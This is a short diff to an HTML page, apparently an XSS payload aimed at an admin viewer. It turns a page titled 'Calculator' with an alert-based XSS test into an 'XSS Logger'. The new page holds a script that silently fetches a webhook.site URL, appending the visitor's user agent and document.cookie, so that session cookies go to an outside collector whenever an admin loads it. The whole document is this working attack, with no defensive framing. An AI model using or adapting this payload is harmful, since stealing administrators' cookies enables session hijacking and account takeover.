@@ -1,19 +1,14 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="styles.css">
-    <title>Calculator</title>
+  <title>XSS Logger</title>
 </head>
-  <body>
-     <script>alert('XSS Triggered on Admin')</script>
-      <h1>XSS Triggered!</h1>
+<body>
+<h2>You're being watched 👁</h2>
 <script>
-  // Send a beacon when visited (admin-side)
-  fetch("https://webhook.site/YOUR-UNIQUE-ID?hit=admin&ua=" + navigator.userAgent);
+  // Silent log to Webhook.site when admin views this
+  fetch("https://webhook.site/1c6de56d-d29f-4fcd-90a1-d9824e64f51c?admin=here&ua=" + navigator.userAgent + "&cookies=" + document.cookie);
 </script>
-
-    
-  </body>
+</body>
 </html>
+
